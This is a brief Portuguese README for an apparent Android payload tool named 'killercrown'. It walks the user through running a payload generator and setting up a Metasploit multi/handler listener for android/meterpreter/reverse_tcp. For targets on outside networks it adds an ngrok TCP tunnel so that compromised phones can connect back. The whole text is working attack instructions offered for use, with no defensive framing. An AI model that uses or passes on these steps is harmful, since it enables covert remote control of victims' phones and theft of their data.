# killercrown

cd /killercrown
./PAYLOAD
seleciona  a opcao deseja
se for 1 meti o endereco ip da sua maquina e uma porta aberta
para configurar o metasploit incia o msfconsole
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST eoipquevoceusounopayload
set LPORT eaportaquevoceusounopayload
exploit
##rede externa
se for a opcao 2 vai precisar usar do servico nrgok inicia ele usando: ngrok tcp eumaporta 
o ngrok vai gerar uma porta exemplo: 0.tcp.ngrok.io:eaportagerada
quando escolher a opcao 2 voce coloca essa porta que foi gerada
configurar o metasploit
inicia o metasploit
use exploit/multi/handler
set paylaod android/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT aportaquevoceusouparaabrir o ngrok
exploit
